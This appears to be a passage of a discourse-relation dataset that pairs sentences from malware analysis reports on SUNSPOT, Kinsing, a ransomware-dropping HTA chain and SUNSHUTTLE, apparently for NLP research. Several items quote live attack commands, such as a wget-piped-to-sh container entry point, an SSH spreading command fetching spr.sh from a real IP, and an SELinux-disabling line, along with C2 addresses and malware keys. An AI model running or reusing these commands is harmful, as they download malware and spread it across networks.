        "S2": "In particular, SUNSPOT\u2019s entry point was added to the legitimate Orion software RefreshInternal function by adding the following try/catch block:",
        "relation": "ELABORATION"
    },
    {
        "S1": "In particular, SUNSPOT\u2019s entry point was added to the legitimate Orion software RefreshInternal function by adding the following try/catch block:",
        "S2": "- The following TTPs may be used to characterize the SUNSPOT activity described in this blog:",
        "relation": "MISC"
    },
    {
        "S1": "- The following TTPs may be used to characterize the SUNSPOT activity described in this blog:",
        "S2": "- Persistence using scheduled tasks, triggered at boot time",
        "relation": "ELABORATION"
    },
    {
        "S1": "- Persistence using scheduled tasks, triggered at boot time",
        "S2": "- Use of AES128-CBC to protect the targeted source code files and the backdoored source code file in the binary",
        "relation": "LIST"
    },
    {
        "S1": "- Use of AES128-CBC to protect the targeted source code files and the backdoored source code file in the binary",
        "S2": "- Use of RC4 encryption with a hard-coded key to protect the log file entries",
        "relation": "LIST"
    },
    {
        "S1": "- Use of RC4 encryption with a hard-coded key to protect the log file entries",
        "S2": "- Log entries from different executions of the malware that are separated with a hard-coded value 32 78 A5 E7 1A 79 91 AC",
        "relation": "LIST"
    },
    {
        "S1": "- Log entries from different executions of the malware that are separated with a hard-coded value 32 78 A5 E7 1A 79 91 AC",
        "S2": "- Log file creation in the system temp directory C:\\Windows\\Temp\\vmware-vmdmp.log masquerading as a legitimate VMWare log file",
        "relation": "LIST"
    },
    {
        "S1": "- Log file creation in the system temp directory C:\\Windows\\Temp\\vmware-vmdmp.log masquerading as a legitimate VMWare log file",
        "S2": "- Detection of the targeted Visual Studio solution build by reading the virtual memory of MsBuild.exe processes, looking for the targeted solution filename",
        "relation": "LIST"
    },
    {
        "S1": "- Detection of the targeted Visual Studio solution build by reading the virtual memory of MsBuild.exe processes, looking for the targeted solution filename",
        "S2": "- Access to the remote process arguments made via the remote process\u2019s PEB structure",
        "relation": "LIST"
    },
    {
        "S1": "- Access to the remote process arguments made via the remote process\u2019s PEB structure",
        "S2": "- Replacement of source code files during the build process, before compilation, by replacing file content with another version containing SUNBURST",
        "relation": "LIST"
    },
    {
        "S1": "- Replacement of source code files during the build process, before compilation, by replacing file content with another version containing SUNBURST",
        "S2": "- Insertion of the backdoor code within #pragma statements disabling and restoring warnings, to prevent the backdoor code lines from appearing in build logs",
        "relation": "LIST"
    },
    {
        "S1": "- Insertion of the backdoor code within #pragma statements disabling and restoring warnings, to prevent the backdoor code lines from appearing in build logs",
        "S2": "- Check of the MD5 hashes of the original source code and of the backdoored source code to ensure the tampering will not cause build errors",
        "relation": "LIST"
    },
    {
        "S1": "- Check of the MD5 hashes of the original source code and of the backdoored source code to ensure the tampering will not cause build errors",
        "S2": "- Attempt to open a non-existing mutex to detect when the malware operators want the backdoor to stop execution and safely exit",
        "relation": "LIST"
    },
    {
        "S1": "Taking advantage of the unprotected open Docker API port, the attackers are able to instantiate an Ubuntu container with the following entry point: /bin/bash -c apt-get update && apt-get install -y wget cron;service cron start; wget -q -O - 142.44.191.122/d.sh | sh;tail -f /dev/null",
        "S2": "We saw this entry point in every attack in this campaign, with the only change being the IP address that d.sh is downloaded from.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We saw this entry point in every attack in this campaign, with the only change being the IP address that d.sh is downloaded from.",
        "S2": "We witnessed 3 IP addresses used in total--the one in the example above, 217.12.221.244 and 185.92.74.42",
        "relation": "ELABORATION"
    },
    {
        "S1": "We witnessed 3 IP addresses used in total--the one in the example above, 217.12.221.244 and 185.92.74.42",
        "S2": "The command does the following:",
        "relation": "MISC"
    },
    {
        "S1": "The command does the following:",
        "S2": "- Update packages with apt-get update",
        "relation": "ELABORATION"
    },
    {
        "S1": "- Update packages with apt-get update",
        "S2": "- Install wget with apt-get",
        "relation": "NEXT"
    },
    {
        "S1": "- Install wget with apt-get",
        "S2": "- Start the cron service.",
        "relation": "NEXT"
    },
    {
        "S1": "- Start the cron service.",
        "S2": "- Download a shell script with the just installed wget",
        "relation": "NEXT"
    },
    {
        "S1": "- Download a shell script with the just installed wget",
        "S2": "- Run the shell script and read indefinitely from /dev/null to keep the container alive and running",
        "relation": "NEXT"
    },
    {
        "S1": "- Run the shell script and read indefinitely from /dev/null to keep the container alive and running",
        "S2": "We can see that the wget program was required to download the cron shell script.",
        "relation": "MISC"
    },
    {
        "S1": "We can see that the wget program was required to download the cron shell script.",
        "S2": "The script would be later used in order to gain persistency within the container.",
        "relation": "NEXT"
    },
    {
        "S1": "The script would be later used in order to gain persistency within the container.",
        "S2": "The shell script d.sh, referred to from hereon as 'the shell script\u2019, contains more than 600 lines.",
        "relation": "MISC"
    },
    {
        "S1": "The shell script d.sh, referred to from hereon as 'the shell script\u2019, contains more than 600 lines.",
        "S2": "We discovered that the shell script does the following:",
        "relation": "ELABORATION"
    },
    {
        "S1": "We discovered that the shell script does the following:",
        "S2": "- Disables security measures and clears logs: echo SELINUX=disabled >/etc/selinux/config",
        "relation": "NEXT"
    },
    {
        "S1": "- Disables security measures and clears logs: echo SELINUX=disabled >/etc/selinux/config",
        "S2": "- Kills numerous applications, notably other malwares and cryptominers.",
        "relation": "NEXT"
    },
    {
        "S1": "- Kills numerous applications, notably other malwares and cryptominers.",
        "S2": "- Deletes files related to other malwares/cryptominers, most of them from the /tmp directory",
        "relation": "NEXT"
    },
    {
        "S1": "- Deletes files related to other malwares/cryptominers, most of them from the /tmp directory",
        "S2": "- Kills running rival malicious Docker containers and deletes their image.",
        "relation": "NEXT"
    },
    {
        "S1": "- Kills running rival malicious Docker containers and deletes their image.",
        "S2": "- Downloads the \u2018kinsing\u2019 malware and runs it",
        "relation": "NEXT"
    },
    {
        "S1": "- Downloads the \u2018kinsing\u2019 malware and runs it",
        "S2": "- Uses crontab to download and run the shell script every minute",
        "relation": "NEXT"
    },
    {
        "S1": "- Uses crontab to download and run the shell script every minute",
        "S2": "- Looks for other commands running in cron, and if ones were identified, deletes all cron jobs, including its own.",
        "relation": "NEXT"
    },
    {
        "S1": "- Looks for other commands running in cron, and if ones were identified, deletes all cron jobs, including its own.",
        "S2": "We are not certain why the attackers chose to do so, but that is what the script executes: crontab -l | sed '/update.sh/d' | crontab -.",
        "relation": "NEXT"
    },
    {
        "S1": "We are not certain why the attackers chose to do so, but that is what the script executes: crontab -l | sed '/update.sh/d' | crontab -.",
        "S2": "Kinsing is a Linux agent, identified by Virus Total after we submitted it for analysis.",
        "relation": "MISC"
    },
    {
        "S1": "Kinsing is a Linux agent, identified by Virus Total after we submitted it for analysis.",
        "S2": "From here on we\u2019ll refer to the malware as kinsing.",
        "relation": "ELABORATION"
    },
    {
        "S1": "From here on we\u2019ll refer to the malware as kinsing.",
        "S2": "A quick look at the malware\u2019s strings reveals that it is a Golang-based Linux agent.",
        "relation": "ELABORATION"
    },
    {
        "S1": "A quick look at the malware\u2019s strings reveals that it is a Golang-based Linux agent.",
        "S2": "It uses several Go libraries, including:",
        "relation": "ELABORATION"
    },
    {
        "S1": "It uses several Go libraries, including:",
        "S2": "- go-resty \u2013 an HTTP and REST client library, used to communicate with a Command and Control (C&C) server.",
        "relation": "ELABORATION"
    },
    {
        "S1": "- go-resty \u2013 an HTTP and REST client library, used to communicate with a Command and Control (C&C) server.",
        "S2": "- gopsutil \u2013 a process utility library, used for system and processes monitoring.",
        "relation": "LIST"
    },
    {
        "S1": "- gopsutil \u2013 a process utility library, used for system and processes monitoring.",
        "S2": "- osext \u2013 extension to the standard \u2018os\u2019 package, used to execute binaries.",
        "relation": "LIST"
    },
    {
        "S1": "- osext \u2013 extension to the standard \u2018os\u2019 package, used to execute binaries.",
        "S2": "- extension to the standard \u2018os\u2019 package, used to execute binaries.",
        "relation": "LIST"
    },
    {
        "S1": "- extension to the standard \u2018os\u2019 package, used to execute binaries.",
        "S2": "diskv - A disk-backed key-value store, for storage.",
        "relation": "LIST"
    },
    {
        "S1": "diskv - A disk-backed key-value store, for storage.",
        "S2": "Running the malware in a controlled environment and monitoring it brought up more details about its malicious actions.",
        "relation": "MISC"
    },
    {
        "S1": "Running the malware in a controlled environment and monitoring it brought up more details about its malicious actions.",
        "S2": "Before the malware proceeded to deploy its payload, it attempted to communicate with servers in Eastern Europe.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Before the malware proceeded to deploy its payload, it attempted to communicate with servers in Eastern Europe.",
        "S2": "It appears that there are dedicated servers for each function that the malware executes:",
        "relation": "ELABORATION"
    },
    {
        "S1": "It appears that there are dedicated servers for each function that the malware executes:",
        "S2": "- Attempts to establish a connection with the following IP address: 45.10.88.102.",
        "relation": "ELABORATION"
    },
    {
        "S1": "- Attempts to establish a connection with the following IP address: 45.10.88.102.",
        "S2": "The attempts fail as the server does not respond.",
        "relation": "NEXT"
    },
    {
        "S1": "The attempts fail as the server does not respond.",
        "S2": "- Connects to 91.215.169.111, which appears to be the main C&C server.",
        "relation": "MISC"
    },
    {
        "S1": "- Connects to 91.215.169.111, which appears to be the main C&C server.",
        "S2": "The malware communicates with that host over HTTP port 80, and sends small encrypted messages on regular intervals, every few seconds.",
        "relation": "NEXT"
    },
    {
        "S1": "The malware communicates with that host over HTTP port 80, and sends small encrypted messages on regular intervals, every few seconds.",
        "S2": "- Connects to 217.12.221.244/spre.sh, which we presume stands for spread, as we will see in the next paragraph, to download a shell script used for lateral movement purposes.",
        "relation": "ELABORATION"
    },
    {
        "S1": "- Connects to 217.12.221.244/spre.sh, which we presume stands for spread, as we will see in the next paragraph, to download a shell script used for lateral movement purposes.",
        "S2": "- Connects to 193.33.87.219 to download the cryptominer C&C communication.",
        "relation": "ELABORATION"
    },
    {
        "S1": "- Connects to 193.33.87.219 to download the cryptominer C&C communication.",
        "S2": "The spre.sh shell script that the malware downloads is used to laterally spread the malware across the container network.",
        "relation": "NEXT"
    },
    {
        "S1": "The spre.sh shell script that the malware downloads is used to laterally spread the malware across the container network.",
        "S2": "In order to discover potential targets and locate the information it needs to authenticate against, the script passively collects data from /.ssh/config, .bash_history, /.ssh/known_hosts, and the likes.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In order to discover potential targets and locate the information it needs to authenticate against, the script passively collects data from /.ssh/config, .bash_history, /.ssh/known_hosts, and the likes.",
        "S2": "We did not identify any active scanning techniques used to identify additional targets.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We did not identify any active scanning techniques used to identify additional targets.",
        "S2": "Using the information gathered, the malware then attempts to connect to each host, using every possible user and key combination through SSH, in order to download the aforementioned shell script and run the malware on other hosts or containers in the network.",
        "relation": "MISC"
    },
    {
        "S1": "Using the information gathered, the malware then attempts to connect to each host, using every possible user and key combination through SSH, in order to download the aforementioned shell script and run the malware on other hosts or containers in the network.",
        "S2": "The actual shell script is named spr.sh this time around, but it is identical to the a d.sh shell script used earlier in the attack sequence",
        "relation": "ELABORATION"
    },
    {
        "S1": "The actual shell script is named spr.sh this time around, but it is identical to the a d.sh shell script used earlier in the attack sequence",
        "S2": "The following SSH command was used to spread it throughout the network: ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=5 -i $key $user@$host -p$sshp \"sudo curl -L http://217.12.221.244/spr.sh|sh; sudo wget -q -O - http://217.12.221.244/spr.sh|sh;\"",
        "relation": "ELABORATION"
    },
    {
        "S1": "The following SSH command was used to spread it throughout the network: ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=5 -i $key $user@$host -p$sshp \"sudo curl -L http://217.12.221.244/spr.sh|sh; sudo wget -q -O - http://217.12.221.244/spr.sh|sh;\"",
        "S2": "We noticed a comment in the script for a 20 seconds sleep after every 20 SSH connection attempts, and their cleanup, possibly indicating that the attackers have some sense of evasion and were trying to hide their activities.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We noticed a comment in the script for a 20 seconds sleep after every 20 SSH connection attempts, and their cleanup, possibly indicating that the attackers have some sense of evasion and were trying to hide their activities.",
        "S2": "At the last stage of the attack the malware runs a cryptominer called kdevtmpfsi.",
        "relation": "NEXT"
    },
    {
        "S1": "At the last stage of the attack the malware runs a cryptominer called kdevtmpfsi.",
        "S2": "The cryptominer was identified by Virus Total as a Bitcoin miner.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The cryptominer was identified by Virus Total as a Bitcoin miner.",
        "S2": "The cryptominer connects to a host with the 193.33.87.219 IP address using a log in request over HTTP, receives further instructions, and starts mining cryptocurrency.",
        "relation": "ELABORATION"
    },
    {
        "S1": "As pointed out in Malwarebytes\u2019s public report, the actor sent weaponized documents to the victim as an initial infection vector.",
        "S2": "The documents use sophisticated infection methods to try to impede detection.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The documents use sophisticated infection methods to try to impede detection.",
        "S2": "The initial infection can be summarized like this:",
        "relation": "MISC"
    },
    {
        "S1": "The initial infection can be summarized like this:",
        "S2": "- The user opens the malicious document and subsequently allows the macro to be executed;",
        "relation": "ELABORATION"
    },
    {
        "S1": "- The user opens the malicious document and subsequently allows the macro to be executed;",
        "S2": "- A popup message box appears;",
        "relation": "NEXT"
    },
    {
        "S1": "- A popup message box appears;",
        "S2": "- The current document gets saved to the path %temp% as HTML and accordingly stores all image files separately within the same directory;",
        "relation": "NEXT"
    },
    {
        "S1": "- The current document gets saved to the path %temp% as HTML and accordingly stores all image files separately within the same directory;",
        "S2": "- Show decoy document;",
        "relation": "NEXT"
    },
    {
        "S1": "- Show decoy document;",
        "S2": "- Convert %temp%[document name]\\image003.png to the BMP file format and add the extension .zip;",
        "relation": "NEXT"
    },
    {
        "S1": "- Convert %temp%[document name]\\image003.png to the BMP file format and add the extension .zip;",
        "S2": "- Execute image003.zip, which actually contains HTML Application (HTA) code, with mshta.exe;",
        "relation": "NEXT"
    },
    {
        "S1": "- Execute image003.zip, which actually contains HTML Application (HTA) code, with mshta.exe;",
        "S2": "- Remove previously created, temporary files.",
        "relation": "NEXT"
    },
    {
        "S1": "- Remove previously created, temporary files.",
        "S2": "The executed image003.zip is an HTML Application (HTA) file containing the second stage payload.",
        "relation": "MISC"
    },
    {
        "S1": "The executed image003.zip is an HTML Application (HTA) file containing the second stage payload.",
        "S2": "This HTA code creates the next payload at the hardcoded path C:/Users/Public/Downloads/Winvoke.exe.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This HTA code creates the next payload at the hardcoded path C:/Users/Public/Downloads/Winvoke.exe.",
        "S2": "Besides the Microsoft Word document, the actor used an additional, alternative infection method according to our telemetry.",
        "relation": "MISC"
    },
    {
        "S1": "Besides the Microsoft Word document, the actor used an additional, alternative infection method according to our telemetry.",
        "S2": "Although we weren\u2019t able to acquire the initial file, we assume the actor delivered a file disguised as a PDF, since we discovered artefacts containing the path of the tool ezPDFReader: c:\\program files (x86)\\unidocs\\ezpdfreader2.0g\\ezpdfwslauncher.exe.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Although we weren\u2019t able to acquire the initial file, we assume the actor delivered a file disguised as a PDF, since we discovered artefacts containing the path of the tool ezPDFReader: c:\\program files (x86)\\unidocs\\ezpdfreader2.0g\\ezpdfwslauncher.exe.",
        "S2": "This software is developed by a South Korean software company named Unidocs.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This software is developed by a South Korean software company named Unidocs.",
        "S2": "At this point, we\u2019re missing clear evidence of whether the attack leveraged a vulnerability within this software in the infection process or it was used to deceive users by opening a PDF document as a decoy while the HTA payload is fetched from a remote resource.",
        "relation": "MISC"
    },
    {
        "S1": "At this point, we\u2019re missing clear evidence of whether the attack leveraged a vulnerability within this software in the infection process or it was used to deceive users by opening a PDF document as a decoy while the HTA payload is fetched from a remote resource.",
        "S2": "Notably, the compromised website www.allamwith[.]com was used for a long period of time.",
        "relation": "MISC"
    },
    {
        "S1": "Notably, the compromised website www.allamwith[.]com was used for a long period of time.",
        "S2": "We first saw the URL appearing in the context of this threat actor in September 2020 and it was still in use when we were researching this series of attacks at the end of April 2021.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We first saw the URL appearing in the context of this threat actor in September 2020 and it was still in use when we were researching this series of attacks at the end of April 2021.",
        "S2": "When we analyzed the above malicious URLs, many of the resources had already gone offline, but the attacker is still using one distribution URL: hxxp://www.allamwith[.]com/home/css/skin.html",
        "relation": "ELABORATION"
    },
    {
        "S1": "When we analyzed the above malicious URLs, many of the resources had already gone offline, but the attacker is still using one distribution URL: hxxp://www.allamwith[.]com/home/css/skin.html",
        "S2": "The URL hosts still serving the HTML Application (HTA) file exhibit similar functions as the HTA file created by the malicious Word document.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The URL hosts still serving the HTML Application (HTA) file exhibit similar functions as the HTA file created by the malicious Word document.",
        "S2": "However, in the case of remotely fetched HTA code with PDF-style attacks, the next payload gets dropped to a different hardcoded path, located at C:/users/public/iexplore.exe, and eventually executed.",
        "relation": "NEXT"
    },
    {
        "S1": "However, in the case of remotely fetched HTA code with PDF-style attacks, the next payload gets dropped to a different hardcoded path, located at C:/users/public/iexplore.exe, and eventually executed.",
        "S2": "The second stage payload is responsible for communicating with the C2 server and preparing another payload for the next stage.",
        "relation": "NEXT"
    },
    {
        "S1": "The second stage payload is responsible for communicating with the C2 server and preparing another payload for the next stage.",
        "S2": "This second stage malware decrypts the embedded payload at runtime.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This second stage malware decrypts the embedded payload at runtime.",
        "S2": "It uses an embedded 16-byte XOR key to decrypt the base64 encoded payload.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It uses an embedded 16-byte XOR key to decrypt the base64 encoded payload.",
        "S2": "The decrypted payload is another portable executable file that runs in memory.",
        "relation": "NEXT"
    },
    {
        "S1": "The decrypted payload is another portable executable file that runs in memory.",
        "S2": "The infection procedure of the second stage payload:",
        "relation": "MISC"
    },
    {
        "S1": "The infection procedure of the second stage payload:",
        "S2": "- Create mutex named Microsoft32.",
        "relation": "ELABORATION"
    },
    {
        "S1": "- Create mutex named Microsoft32.",
        "S2": "- Resolve API address: base64 decoding + RC4 decryption with the key MicrosoftCorporationValidation@#$%^&*()!US",
        "relation": "NEXT"
    },
    {
        "S1": "- Resolve API address: base64 decoding + RC4 decryption with the key MicrosoftCorporationValidation@#$%^&*()!US",
        "S2": "- Retrieve C2 addresses: base64 decoding + custom XOR decryption.",
        "relation": "NEXT"
    },
    {
        "S1": "- Retrieve C2 addresses: base64 decoding + custom XOR decryption.",
        "S2": "- Communication with C2.",
        "relation": "NEXT"
    },
    {
        "S1": "- Communication with C2.",
        "S2": "According to the response from the C2 server, the payload is able to perform five actions:",
        "relation": "NEXT"
    },
    {
        "S1": "According to the response from the C2 server, the payload is able to perform five actions:",
        "S2": "The malware operator appears to deliver the third stage payload by using the above functionalities, as our telemetry reveals.",
        "relation": "NEXT"
    },
    {
        "S1": "The malware operator appears to deliver the third stage payload by using the above functionalities, as our telemetry reveals.",
        "S2": "Both second and third stage payloads also share an identical icon, which looks like Internet Explorer.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Both second and third stage payloads also share an identical icon, which looks like Internet Explorer.",
        "S2": "The third stage payload was created via the second stage payload, is interactively executed in the operation and exists in both x64 and x86 versions.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The third stage payload was created via the second stage payload, is interactively executed in the operation and exists in both x64 and x86 versions.",
        "S2": "Most of them use Internet Explorer or Google Chrome icons and corresponding file names to disguise themselves as legitimate internet browsers.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Most of them use Internet Explorer or Google Chrome icons and corresponding file names to disguise themselves as legitimate internet browsers.",
        "S2": "The third stage decrypts the embedded payload and executes it.",
        "relation": "MISC"
    },
    {
        "S1": "The third stage decrypts the embedded payload and executes it.",
        "S2": "The embedded payload shows the same structure as the second stage payload discussed above.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The embedded payload shows the same structure as the second stage payload discussed above.",
        "S2": "Once launched, it checks for the mutex QD33qhhXKK and inspects the system for signs of a sandbox environment by searching for the presence of specific modules.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Once launched, it checks for the mutex QD33qhhXKK and inspects the system for signs of a sandbox environment by searching for the presence of specific modules.",
        "S2": "The strings of module names to be checked are decoded with a hardcoded XOR key: 0x4B762A554559586F6A45656545654130",
        "relation": "NEXT"
    },
    {
        "S1": "The strings of module names to be checked are decoded with a hardcoded XOR key: 0x4B762A554559586F6A45656545654130",
        "S2": "- sbiedll.dll: Sandboxie module",
        "relation": "MISC"
    },
    {
        "S1": "- sbiedll.dll: Sandboxie module",
        "S2": "- api_log.dll: SunBelt SandBox module",
        "relation": "LIST"
    },
    {
        "S1": "- api_log.dll: SunBelt SandBox module",
        "S2": "- dir_watch.dll: SunBelt SandBox module",
        "relation": "LIST"
    },
    {
        "S1": "- dir_watch.dll: SunBelt SandBox module",
        "S2": "With the environment checks done, the main payload gets decrypted using the same XOR key and launched with rundll32.exe.",
        "relation": "MISC"
    },
    {
        "S1": "With the environment checks done, the main payload gets decrypted using the same XOR key and launched with rundll32.exe.",
        "S2": "Three C2 addresses then get extracted and decrypted using DES, with all addresses pointing to the same IP (23.229.111[.]197) in this sample.",
        "relation": "NEXT"
    },
    {
        "S1": "Three C2 addresses then get extracted and decrypted using DES, with all addresses pointing to the same IP (23.229.111[.]197) in this sample.",
        "S2": "The malware then sends a hardcoded string to the C2 server: \u201cHTTP 1.1 /member.php SSL3.4\u201d.",
        "relation": "NEXT"
    },
    {
        "S1": "The malware then sends a hardcoded string to the C2 server: \u201cHTTP 1.1 /member.php SSL3.4\u201d.",
        "S2": "Next, it checks if the C2\u2019s response data equals \u201cHTTP 1.1 200 OK SSL2.1\u201d and, if positive, starts conducting its backdoor operations.",
        "relation": "NEXT"
    },
    {
        "S1": "Next, it checks if the C2\u2019s response data equals \u201cHTTP 1.1 200 OK SSL2.1\u201d and, if positive, starts conducting its backdoor operations.",
        "S2": "The samples contain debug data and thereby expose function names disclosing their purpose:",
        "relation": "MISC"
    },
    {
        "S1": "The samples contain debug data and thereby expose function names disclosing their purpose:",
        "S2": "- ModuleUpdate: Replace the current module with a batch file",
        "relation": "ELABORATION"
    },
    {
        "S1": "- ModuleUpdate: Replace the current module with a batch file",
        "S2": "- ModuleShell: Execute Windows command, changes working directory, Connect to given IP address",
        "relation": "LIST"
    },
    {
        "S1": "- ModuleShell: Execute Windows command, changes working directory, Connect to given IP address",
        "S2": "- ModuleFileManager: Get disk information, File listing, File manipulation",
        "relation": "LIST"
    },
    {
        "S1": "- ModuleFileManager: Get disk information, File listing, File manipulation",
        "S2": "- ModuleScreenCapture: Take a screenshot",
        "relation": "LIST"
    },
    {
        "S1": "- ModuleScreenCapture: Take a screenshot",
        "S2": "Interestingly, one victim was discovered to have received ransomware after the third stage payload.",
        "relation": "MISC"
    },
    {
        "S1": "Interestingly, one victim was discovered to have received ransomware after the third stage payload.",
        "S2": "This ransomware sample is custom made and specifically developed by the threat actor behind this attack.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This ransomware sample is custom made and specifically developed by the threat actor behind this attack.",
        "S2": "This ransomware is controlled by command line parameters and can either retrieve an encryption key from the C2 or, alternatively, as an argument at launch time.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This ransomware is controlled by command line parameters and can either retrieve an encryption key from the C2 or, alternatively, as an argument at launch time.",
        "S2": "We saw the malware executed with the following parameter options in our telemetry, with some parameters illustrated below:",
        "relation": "ELABORATION"
    },
    {
        "S1": "We saw the malware executed with the following parameter options in our telemetry, with some parameters illustrated below:",
        "S2": "Upon launch, the ransomware checks the number of parameters.",
        "relation": "NEXT"
    },
    {
        "S1": "Upon launch, the ransomware checks the number of parameters.",
        "S2": "If the number of arguments is less than six, the malware terminates itself.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If the number of arguments is less than six, the malware terminates itself.",
        "S2": "If there is no extension for the encrypted files specified, the malware uses a default extension (.3nc004) and a default file name for the ransom note (3nc004.txt).",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If there is no extension for the encrypted files specified, the malware uses a default extension (.3nc004) and a default file name for the ransom note (3nc004.txt).",
        "S2": "If the victim ID is left unspecified, the ransomware generates a random ID 24 characters long.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If the victim ID is left unspecified, the ransomware generates a random ID 24 characters long.",
        "S2": "If the malware is executed with the -s(-S) option, it sends the victim ID to the C2 server and receives the initial vector (IV) and key to encrypt files.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If the malware is executed with the -s(-S) option, it sends the victim ID to the C2 server and receives the initial vector (IV) and key to encrypt files.",
        "S2": "Each of the strings has a length of 32 characters.",
        "relation": "MISC"
    },
    {
        "S1": "Each of the strings has a length of 32 characters.",
        "S2": "When the ransomware communicates with the C2 server, it uses the same authentication process and strings as the third stage payload.",
        "relation": "ELABORATION"
    },
    {
        "S1": "When the ransomware communicates with the C2 server, it uses the same authentication process and strings as the third stage payload.",
        "S2": "The ransomware uses an AES-128 CBC mode algorithm to encrypt files on the victim machine.",
        "relation": "NEXT"
    },
    {
        "S1": "The ransomware uses an AES-128 CBC mode algorithm to encrypt files on the victim machine.",
        "S2": "With the exception of system-critical files (\u201c.exe\u201d, \u201c.dll\u201d, \u201c.sys\u201d, .\u201dmsiins\u201d, and \u201c.drv\u201d extensions), the malware encrypts files completely, irrespective of file size.",
        "relation": "ELABORATION"
    },
    {
        "S1": "With the exception of system-critical files (\u201c.exe\u201d, \u201c.dll\u201d, \u201c.sys\u201d, .\u201dmsiins\u201d, and \u201c.drv\u201d extensions), the malware encrypts files completely, irrespective of file size.",
        "S2": "However, since important system configuration files are affected by the encryption procedure as well, it can lead to an unstable system.",
        "relation": "NEXT"
    },
    {
        "S1": "However, since important system configuration files are affected by the encryption procedure as well, it can lead to an unstable system.",
        "S2": "As a final step, it leaves a ransom note on the desktop and in the startup folder and opens it with notepad.exe.",
        "relation": "NEXT"
    },
    {
        "S1": "Once executed, the SUNSHUTTLE backdoor enumerates the victim\u2019s MAC address and compares it to a hardcoded MAC address value \u201cc8:27:cc:c2:37:5a\u201d.",
        "S2": "If a match is found the backdoor exits.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If a match is found the backdoor exits.",
        "S2": "The MAC address is likely a default MAC address for the Windows sandbox network adapter.",
        "relation": "MISC"
    },
    {
        "S1": "The MAC address is likely a default MAC address for the Windows sandbox network adapter.",
        "S2": "If the check is successful, the SUNSHUTTLE backdoor then enters a routine named \u201c\ufeffmain_define_internal_settings\u201d, which handles creation of the configuration file if one doesn\u2019t already exist in the directory from which SUNSHUTTLE is running.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If the check is successful, the SUNSHUTTLE backdoor then enters a routine named \u201c\ufeffmain_define_internal_settings\u201d, which handles creation of the configuration file if one doesn\u2019t already exist in the directory from which SUNSHUTTLE is running.",
        "S2": "For the sample analyzed, the configuration filename is \u201cconfig.dat.tmp\u201d.",
        "relation": "ELABORATION"
    },
    {
        "S1": "For the sample analyzed, the configuration filename is \u201cconfig.dat.tmp\u201d.",
        "S2": "The configuration data is Base64 encoded and AES-256 encrypted using the following key: hz8l2fnpvp71ujfy8rht6b0smouvp9k8",
        "relation": "ELABORATION"
    },
    {
        "S1": "The configuration data is Base64 encoded and AES-256 encrypted using the following key: hz8l2fnpvp71ujfy8rht6b0smouvp9k8",
        "S2": "The configuration has the following example values when Base64 decoded and AES decrypted:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The configuration has the following example values when Base64 decoded and AES decrypted:",
        "S2": "The configuration holds several values delimited by a \u201c|\u201d character, which are briefly described as follows.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The configuration holds several values delimited by a \u201c|\u201d character, which are briefly described as follows.",
        "S2": "If set in the configuration, the \u201cblend-in\u201d traffic occurs as the malware executes and transitions through its routines.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If set in the configuration, the \u201cblend-in\u201d traffic occurs as the malware executes and transitions through its routines.",
        "S2": "The following URLs are leveraged for the \u201cblend-in\u201d requests:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The following URLs are leveraged for the \u201cblend-in\u201d requests:",
        "S2": "SUNSHUTTLE performs initial requests to the C2 in order to request and then retrieve what it internally refers to as a session key.",
        "relation": "MISC"
    },
    {
        "S1": "SUNSHUTTLE performs initial requests to the C2 in order to request and then retrieve what it internally refers to as a session key.",
        "S2": "The retrieved session key from the C2 appears to be RSA decrypted using the following private key that is embedded in SUNSHUTTLE and believed to be unique per compiled sample.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The retrieved session key from the C2 appears to be RSA decrypted using the following private key that is embedded in SUNSHUTTLE and believed to be unique per compiled sample.",
        "S2": "Analysis is on-going on how the decrypted session key is used, but it is likely a session key used to encrypt content once SUNSHUTTLE transitions to its command-and-control routines.",
        "relation": "NEXT"
    },
    {
        "S1": "Analysis is on-going on how the decrypted session key is used, but it is likely a session key used to encrypt content once SUNSHUTTLE transitions to its command-and-control routines.",
        "S2": "After the configuration is created or read from, SUNSHUTTLE enters a routine named \u201c\ufeffmain_request_session_key\u201d.",
        "relation": "NEXT"
    },
    {
        "S1": "After the configuration is created or read from, SUNSHUTTLE enters a routine named \u201c\ufeffmain_request_session_key\u201d.",
        "S2": "The malware will iterate over this routine until it\u2019s successful, sleeping a period of time after each iteration.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The malware will iterate over this routine until it\u2019s successful, sleeping a period of time after each iteration.",
        "S2": "Inside the \u201c\ufeffmain_request_session_key\u201d routine, SUNSHUTTLE constructs an HTTPS request to its configured C2.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Inside the \u201c\ufeffmain_request_session_key\u201d routine, SUNSHUTTLE constructs an HTTPS request to its configured C2.",
        "S2": "Upon an HTTP 200 response from the request, the response data from the C2 is expected to not contain the following string for the sample analyzed: ywQdjLuHHC",
        "relation": "NEXT"
    },
    {
